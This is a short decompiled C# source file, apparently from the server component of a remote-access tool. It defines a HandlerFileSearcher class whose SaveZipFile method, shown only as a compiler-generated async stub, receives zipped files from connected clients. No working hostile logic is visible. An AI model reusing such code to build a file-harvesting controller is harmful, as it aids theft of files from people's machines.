using System;
using System.Runtime.CompilerServices;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x02000053 RID: 83
	public class HandlerFileSearcher
	{
		// Token: 0x060001CE RID: 462 RVA: 0x00011190 File Offset: 0x0000F390
		public void SaveZipFile(Clients client, MsgPack unpack_msgpack)
		{
			HandlerFileSearcher.<SaveZipFile>d__0 <SaveZipFile>d__;
			<SaveZipFile>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<SaveZipFile>d__.client = client;
			<SaveZipFile>d__.unpack_msgpack = unpack_msgpack;
			<SaveZipFile>d__.<>1__state = -1;
			<SaveZipFile>d__.<>t__builder.Start<HandlerFileSearcher.<SaveZipFile>d__0>(ref <SaveZipFile>d__);
		}
	}
}
